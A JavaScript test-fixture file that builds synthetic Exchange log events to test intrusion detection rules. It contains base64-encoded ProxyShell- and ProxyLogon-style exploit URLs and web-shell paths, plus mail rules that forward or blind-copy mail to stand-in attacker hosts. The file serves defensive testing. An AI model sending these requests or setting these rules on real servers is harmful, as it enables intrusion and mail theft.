// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
// CLEARLY LABELLED SYNTHETIC TEST EVENTS for engine/detect/rules/exchange.json (merged into detect-fixtures.js).
// Event shapes = what the core parsers emit for Exchange (engine/parse/m365.js unified(), windows.js exchangeMgmt(),
// exchange.js message tracking, iis.js). Exploit-looking URLs are base64-encoded so endpoint AV leaves this file alone.
const { ev, T0, DAY } = require('./detect-fixtures');

const d = (b) => Buffer.from(b, 'base64').toString('utf8');
const U = {
  pshell: d('L2F1dG9kaXNjb3Zlci9hdXRvZGlzY292ZXIuanNvbj9AZXZpbC5leGFtcGxlL3Bvd2Vyc2hlbGwvP1gtUnBzLUNBVD1WZ0VBVkFkWGFXNWtiM2R6UXdCQkNFdGxjbUpsY205eiZFbWFpbD1hdXRvZGlzY292ZXIvYXV0b2Rpc2NvdmVyLmpzb24lM0ZAZXZpbC5leGFtcGxl'),
  nspi: d('L2F1dG9kaXNjb3Zlci9hdXRvZGlzY292ZXIuanNvbj9AZXZpbC5leGFtcGxlL21hcGkvbnNwaS8/JkVtYWlsPWF1dG9kaXNjb3Zlci9hdXRvZGlzY292ZXIuanNvbiUzRkBldmlsLmV4YW1wbGU='),
  plogon: d('L2VjcC95Lmpz'),
  shell: d('L2FzcG5ldF9jbGllbnQvc3lzdGVtX3dlYi9hYmN4eXouYXNweA=='),
  shell2: d('L293YS9hdXRoL2Vycm9yRUUuYXNweA=='),
  theme: d('L293YS9hdXRoL0N1cnJlbnQvdGhlbWVzL3Jlc291cmNlcy9sb2dvbjIuYXNweA=='),
};

const CAT = {
  'inbox-rule-created': 'email', 'inbox-rule-modified': 'email', 'inbox-rule-removed': 'email', 'mail-forwarding-set': 'email', 'mail-forwarding-removed': 'email',
  'mailbox-modified': 'email', 'mailbox-permission-added': 'iam', 'mailbox-folder-permission-added': 'iam', 'sendas-permission-added': 'iam',
  'transport-rule-created': 'policy', 'transport-rule-modified': 'policy', 'transport-rule-removed': 'policy', 'role-assigned': 'iam', 'group-member-added': 'iam',
  'mailbox-export': 'email', 'mail-connector-changed': 'policy', 'org-relationship-changed': 'policy', 'config-read': 'system', 'config-change': 'system', 'audit-disabled': 'system',
};
/** Exchange Online admin audit record as parse/m365.js emits it */
function online(cmdlet, params, action, tags, o) {
  const f = { m365_type: 'unified_audit', Workload: 'Exchange', RecordType: '1', cmdlet, exchange_action: action,
    Parameters: JSON.stringify(Object.entries(params).map(([Name, Value]) => ({ Name, Value }))) };
  for (const [k, v] of Object.entries(params)) f['params.' + k] = v;
  return ev(Object.assign({ src_type: 'm365', host: 'exchange', category: CAT[action] || 'system', action, event_code: cmdlet, outcome: 'success',
    user: 'admin@example.sa', src_ip: '203.0.113.40', target_user: String(params.Identity || params.Mailbox || '').toLowerCase(),
    tags: [...(tags || []), 'exchange', 'exchange-online'], fields: f }, o || {}));
}
/** On-prem "MSExchange Management" admin audit event as parse/windows.js emits it */
function onprem(cmdlet, paramStr, params, action, tags, o) {
  const f = { cmdlet, parameters: paramStr, Parameters: paramStr, Operation: cmdlet, exchange_action: action, caller: 'example.local/Users/exadmin' };
  for (const [k, v] of Object.entries(params)) f['params.' + k] = v;
  return ev(Object.assign({ src_type: 'windows', host: 'ex01', category: CAT[action] || 'system', action: 'exchange-cmdlet', event_code: '1', outcome: 'success',
    user: 'exadmin', target_user: String(params.Identity || params.Mailbox || '').toLowerCase(), tags: [...(tags || []), 'exchange', 'exchange-onprem'], fields: f }, o || {}));
}
const mia = (user, owner, o) => ev(Object.assign({ src_type: 'm365', host: 'exchange', category: 'email', action: 'mail-items-accessed', event_code: 'MailItemsAccessed',
  outcome: 'success', user, target_user: owner, src_ip: '203.0.113.41', tags: ['exchange', 'exchange-online'], fields: { mail_access_type: 'Bind', operation_count: '1', client_info: 'Client=REST' } }, o || {}));
const send = (user, connector, o) => ev(Object.assign({ src_type: 'exchange', host: 'ex01', category: 'email', action: 'send', event_code: 'SEND', outcome: 'success',
  user, target_user: 'someone@external.example', src_ip: '10.0.0.20', tags: ['exchange'], fields: { msgtrk_source: 'SMTP', connector_id: connector, recipient_count: '1' } }, o || {}));
const iis = (url, o) => {
  const vd = (/^\/([^/?]+)/.exec(url) || [])[1] || '';
  return ev(Object.assign({ src_type: 'iis', host: 'ex01', category: 'web', action: 'http-request', http_method: 'GET', url, http_status: 200, outcome: 'success',
    src_ip: '198.51.100.66', user: '', user_agent: 'Mozilla/5.0', tags: ['exchange', 'exchange-' + vd.toLowerCase()], fields: { vdir: vd } }, o || {}));
};
const times = (n, fn) => Array.from({ length: n }, (_, i) => fn(i));

const F = {
  'SENTRA-EXO-001': {
    pos: [
      online('New-InboxRule', { Identity: 'ceo', Name: '.', ForwardTo: 'x@evil.example', DeleteMessage: 'True' }, 'inbox-rule-created', ['T1114.003', 'mail-forwarding', 'T1564.008']),
      onprem('Set-InboxRule', '-Identity "bob\\r1" -MoveToFolder "bob:\\RSS Feeds" -MarkAsRead $true', { Identity: 'bob\\r1', MoveToFolder: 'bob:\\RSS Feeds', MarkAsRead: '$true' }, 'inbox-rule-modified', ['T1564.008'], { user: 'bob' }),
      ev({ src_type: 'm365', host: 'exchange', event_code: 'New-InboxRule', action: 'event', user: 'legacy@example.sa', fields: { Parameters: '[{"Name":"RedirectTo","Value":"y@evil.example"}]' } }), // unclassified (raw names)
    ],
    neg: [
      online('New-InboxRule', { Identity: 'bob', Name: 'Newsletters', From: 'news@vendor.example', ApplyCategory: 'News' }, 'inbox-rule-created', []),
      online('Remove-InboxRule', { Identity: 'bob\\Newsletters' }, 'inbox-rule-removed', []),
      online('Set-InboxRule', { Identity: 'bob\\r1', DeleteMessage: 'False' }, 'inbox-rule-modified', []),
    ],
  },
  'SENTRA-EXO-002': {
    pos: [
      online('Set-Mailbox', { Identity: 'ceo', ForwardingSmtpAddress: 'smtp:ceo.backup@mail.example', DeliverToMailboxAndForward: 'True' }, 'mail-forwarding-set', ['T1114.003', 'mail-forwarding']),
      onprem('Set-RemoteDomain', '-Identity Default -AutoForwardEnabled $true', { Identity: 'Default', AutoForwardEnabled: '$true' }, 'mail-forwarding-set', ['T1114.003', 'mail-forwarding']),
    ],
    neg: [
      online('Set-Mailbox', { Identity: 'cfo', ForwardingSmtpAddress: 'smtp:cfo@corp-internal.example' }, 'mail-forwarding-set', ['T1114.003', 'mail-forwarding']),
      onprem('Set-Mailbox', '-Identity cfo -ForwardingAddress Assistant', { Identity: 'cfo', ForwardingAddress: 'Assistant' }, 'mail-forwarding-set', ['T1114.003', 'mail-forwarding']),
      online('Set-Mailbox', { Identity: 'ceo', ForwardingSmtpAddress: '$null' }, 'mail-forwarding-removed', []),
      onprem('Set-RemoteDomain', '-Identity Default -AutoForwardEnabled $false', { Identity: 'Default', AutoForwardEnabled: '$false' }, 'mail-domain-changed', ['mail-flow']),
    ],
  },
  'SENTRA-EXO-003': {
    pos: [
      online('Add-MailboxPermission', { Identity: 'ceo', User: 'attacker@example.sa', AccessRights: 'FullAccess', InheritanceType: 'All' }, 'mailbox-permission-added', ['T1098.002']),
      onprem('Add-RecipientPermission', '-Identity cfo -Trustee mallory -AccessRights SendAs', { Identity: 'cfo', Trustee: 'mallory', AccessRights: 'SendAs' }, 'sendas-permission-added', ['T1098.002']),
    ],
    neg: [
      online('Add-MailboxPermission', { Identity: 'shared-hr', User: 'hr1@example.sa', AccessRights: 'ReadPermission' }, 'mailbox-permission-added', ['T1098.002']),
      online('Add-MailboxFolderPermission', { Identity: 'ceo:\\Calendar', User: 'pa@example.sa', AccessRights: 'Editor' }, 'mailbox-folder-permission-added', ['T1098.002']),
    ],
  },
  'SENTRA-EXO-004': {
    pos: [online('New-TransportRule', { Name: 'External disclaimer', ApplyHtmlDisclaimerText: 'Confidential', SentToScope: 'NotInOrganization' }, 'transport-rule-created', [])],
    neg: [
      online('Remove-TransportRule', { Identity: 'Old rule' }, 'transport-rule-removed', []),
      onprem('Set-TransportRule', '-Identity x -Priority 1', { Identity: 'x', Priority: '1' }, 'transport-rule-modified', [], { outcome: 'failure', event_code: '6' }),
    ],
  },
  'SENTRA-EXO-005': {
    pos: [onprem('New-TransportRule', '-Name "Audit" -SentToScope NotInOrganization -BlindCopyTo "collector@evil.example"', { Name: 'Audit', SentToScope: 'NotInOrganization', BlindCopyTo: 'collector@evil.example' }, 'transport-rule-created', ['T1114.003', 'mail-forwarding'])],
    neg: [online('New-TransportRule', { Name: 'External disclaimer', ApplyHtmlDisclaimerText: 'Confidential' }, 'transport-rule-created', [])],
  },
  'SENTRA-EXO-006': {
    pos: [onprem('Add-RoleGroupMember', '-Identity "Help Desk" -Member bob', { Identity: 'Help Desk', Member: 'bob' }, 'group-member-added', ['T1098', 'admin'])],
    neg: [
      ev({ src_type: 'm365', host: 'entra-id', category: 'iam', action: 'role-assigned', event_code: 'Add member to role', user: 'ga@example.sa', tags: ['T1098.003', 'admin'] }),
      onprem('Add-RoleGroupMember', '-Identity "Help Desk" -Member bob', { Identity: 'Help Desk', Member: 'bob' }, 'group-member-added', ['T1098', 'admin'], { outcome: 'failure', event_code: '6' }),
    ],
  },
  'SENTRA-EXO-007': {
    pos: [
      online('New-ManagementRoleAssignment', { Role: 'ApplicationImpersonation', User: 'svc-app@example.sa' }, 'role-assigned', ['T1098', 'admin']),
      onprem('Add-RoleGroupMember', '-Identity "Organization Management" -Member mallory', { Identity: 'Organization Management', Member: 'mallory' }, 'group-member-added', ['T1098', 'admin']),
    ],
    neg: [onprem('Add-RoleGroupMember', '-Identity "Help Desk" -Member bob', { Identity: 'Help Desk', Member: 'bob' }, 'group-member-added', ['T1098', 'admin'])],
  },
  'SENTRA-EXO-008': {
    pos: [
      online('Set-InboundConnector', { Identity: 'Inbound from partner', RequireTls: 'False', SenderIPAddresses: '192.0.2.10' }, 'mail-connector-changed', ['hybrid', 'mail-flow']),
      onprem('Set-OrganizationRelationship', '-Identity "O365 to On-premises" -MailboxMoveEnabled $true', { Identity: 'O365 to On-premises', MailboxMoveEnabled: '$true' }, 'org-relationship-changed', ['hybrid']),
    ],
    neg: [
      onprem('Get-OrganizationRelationship', '', {}, 'config-read', []),
      online('Set-Mailbox', { Identity: 'bob', CustomAttribute1: 'x' }, 'mailbox-modified', []),
    ],
  },
  'SENTRA-EXO-009': {
    pos: times(200, (i) => mia('rogue-app@example.sa', 'ceo@example.sa', { ts: T0 + i * 10000 })),
    neg: times(199, (i) => mia('rogue-app@example.sa', 'ceo@example.sa', { ts: T0 + i * 10000 })),
  },
  'SENTRA-EXO-010': {
    pos: times(5, (i) => mia('delegate@example.sa', `owner${i}@example.sa`, { ts: T0 + i * 60000 })),
    neg: times(20, (i) => mia('delegate@example.sa', `owner${i % 4}@example.sa`, { ts: T0 + i * 60000 })),
  },
  'SENTRA-EXO-011': {
    pos: times(100, (i) => send('sales1@example.sa', 'EX01\\Internet Send Connector', { ts: T0 + i * 5000 })),
    neg: [
      ...times(99, (i) => send('sales2@example.sa', 'EX01\\Internet Send Connector', { ts: T0 + i * 5000 })),
      ...times(150, (i) => send('sales3@example.sa', 'Outbound to Office 365 - 1b2c3d4e', { ts: T0 + i * 3000 })),
      ...times(150, (i) => send('sales4@example.sa', '', { ts: T0 + i * 3000, action: 'deliver', event_code: 'DELIVER' })),
    ],
  },
  'SENTRA-EXO-012': {
    pos: [
      iis(U.pshell, { tags: ['exchange', 'exchange-autodiscover', 'T1190', 'proxyshell'] }),
      iis(U.nspi, { src_ip: '198.51.100.67', tags: ['exchange', 'exchange-autodiscover'] }),
      iis(U.plogon, { src_ip: '198.51.100.68' }),
      iis(U.theme, { src_ip: '198.51.100.69' }),
    ],
    neg: [iis('/autodiscover/autodiscover.xml', { http_method: 'POST' }), iis('/ecp/default.aspx', { user: 'bob' }), iis('/owa/auth/logon.aspx?url=https%3a%2f%2fmail.example.sa%2fowa%2f')],
  },
  'SENTRA-EXO-013': {
    pos: times(100, (i) => iis(`/ecp/?r=${i}`, { ts: T0 + i * 2000, http_status: 302 })),
    neg: [
      ...times(100, (i) => iis(`/ecp/?r=${i}`, { ts: T0 + i * 2000, user: 'bob', src_ip: '198.51.100.70' })),
      ...times(99, (i) => iis(`/ecp/?r=${i}`, { ts: T0 + i * 2000, src_ip: '198.51.100.71' })),
      ...times(100, (i) => iis(`/ecp/?r=${i}`, { ts: T0 + i * 2000, src_ip: '127.0.0.1' })),
    ],
  },
  'SENTRA-EXO-014': {
    pos: [iis(U.shell, { http_method: 'POST' }), iis(U.shell2, { src_ip: '198.51.100.72' })],
    neg: [iis('/owa/auth/logon.aspx?replaceCurrent=1&url=x'), iis(U.shell, { http_status: 404, src_ip: '198.51.100.73' })],
  },
  'SENTRA-EXO-015': {
    pos: [
      iis('/powershell?serializationLevel=Full;ExchClientVer=15.2', { ts: T0, src_ip: '10.0.0.30', user: 'exadmin' }),
      iis('/powershell?serializationLevel=Full;ExchClientVer=15.2', { ts: T0 + 8 * DAY, src_ip: '10.9.9.9', user: 'exadmin' }),
    ],
    neg: [
      iis('/powershell?serializationLevel=Full', { ts: T0, src_ip: '10.0.0.30', user: 'exadmin' }),
      iis('/powershell?serializationLevel=Full', { ts: T0 + DAY, src_ip: '10.0.0.31', user: 'exadmin' }),
      iis('/powershell?serializationLevel=Full', { ts: T0 + 8 * DAY, src_ip: '10.0.0.30', user: 'exadmin' }),
      iis('/powershell?serializationLevel=Full', { ts: T0 + 8 * DAY, src_ip: '127.0.0.1', user: 'healthmailbox' }),
    ],
  },
  'SENTRA-EXO-016': {
    pos: [onprem('New-MailboxExportRequest', '-Mailbox ceo -FilePath \\\\fileserver\\pst$\\ceo.pst', { Mailbox: 'ceo', FilePath: '\\\\fileserver\\pst$\\ceo.pst' }, 'mailbox-export', ['T1114.002'])],
    neg: [onprem('Get-MailboxExportRequest', '', {}, 'config-read', []), onprem('New-MailboxImportRequest', '-Mailbox bob -FilePath \\\\fs\\in.pst', { Mailbox: 'bob' }, 'config-change', [])],
  },
  'SENTRA-EXO-017': {
    pos: [onprem('Set-AdminAuditLogConfig', '-AdminAuditLogEnabled $false', { AdminAuditLogEnabled: '$false' }, 'audit-disabled', ['T1685.002'])],
    neg: [
      onprem('Set-AdminAuditLogConfig', '-AdminAuditLogEnabled $true', { AdminAuditLogEnabled: '$true' }, 'config-change', []),
      onprem('Set-MailboxAuditBypassAssociation', '-Identity svc -AuditBypassEnabled $false', { Identity: 'svc', AuditBypassEnabled: '$false' }, 'config-change', []),
    ],
  },
};

module.exports = { FIXTURES: F, INTEL_LISTS: { 'internal-mail-domains': ['corp-internal.example'] }, online, onprem, U };
